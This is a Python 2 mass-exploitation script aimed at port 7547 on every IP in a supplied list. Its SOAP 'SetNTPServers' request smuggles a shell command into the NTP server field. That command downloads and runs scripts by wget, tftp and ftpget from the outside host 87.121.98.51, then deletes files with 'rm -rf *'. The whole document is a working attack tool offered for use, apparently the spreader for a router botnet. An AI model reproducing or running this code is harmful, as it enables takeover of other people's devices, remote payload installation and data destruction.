#!/usr/bin/python

import threading, sys, time, random, socket, re, os

if len(sys.argv) < 2:
        print "Usage: python "+sys.argv[0]+" <list>"
        sys.exit()

ips = open(sys.argv[1], "r").readlines()
cmd = """POST /UD/act?1 HTTP/1.1\r\n
Host: 127.0.0.1:7547\r\n
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\n
Content-Type: text/xml\r\n
Content-Length: length of string after return/newline\r\n
<?xml version="1.0"?>\r\n
<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n
	<SOAP-ENV:Body>\r\n
		<u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">\r\n
			<NewNTPServer1>'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.51/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 87.121.98.51 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 87.121.98.51; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 87.121.98.51 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *'</NewNTPServer1>\r\n
			<NewNTPServer2></NewNTPServer2>\r\n
		    <NewNTPServer3></NewNTPServer3>\r\n
			<NewNTPServer4></NewNTPServer4>\r\n
			<NewNTPServer5></NewNTPServer5>\r\n
		</u:SetNTPServers>\r\n
	</SOAP-ENV:Body>\r\n
</SOAP-ENV:Envelope>\r\n"""
count = 0
def readUntil(tn, string, timeout=15):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

class hackify(threading.Thread):
        def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
        def run(self):
		try:
			tn = socket.socket()
			tn.settimeout(8)
			tn.connect((self.ip,7547))
		except Exception:
			tn.close()

		try:
			mp = ''
			mp += tn.recv(1024)
			if "" in mp:
				tn.send(cmd + "\n"); print "\033[32m[%s] command sent %s!\033[37m"%(count, self.ip); time.sleep(10); tn.close()
		except Exception:
			print "\033[34m[%s] TIMEOUT"%(self.ip)
			tn.close()

print "Total IPs: %s\n"%(len(ips))
for ip in ips:
        try:
		count += 1
		t = hackify(ip)
		t.start()
		time.sleep(0.01)
        except:
            pass